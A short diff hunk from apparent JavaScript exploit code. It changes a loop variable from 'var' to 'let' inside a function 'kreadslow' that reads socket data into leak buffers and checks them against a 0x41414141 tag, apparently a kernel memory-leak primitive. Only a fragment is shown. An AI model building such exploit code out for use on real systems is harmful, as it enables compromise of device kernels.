@@ -1687,7 +1687,7 @@ function kreadslow(addr, size) {
   read(new BigInt(uio_sock_0), tmp, size);
   var leak_buffer = new BigInt(0);
   var tag_val = new BigInt(0x41414141, 0x41414141);
-  for (var j = 0; j < UIO_THREAD_NUM; j++) {
+  for (let j = 0; j < UIO_THREAD_NUM; j++) {
     read(new BigInt(uio_sock_0), leak_buffers[j], size);
     var val = read64(leak_buffers[j]);
     if (!val.eq(tag_val)) {
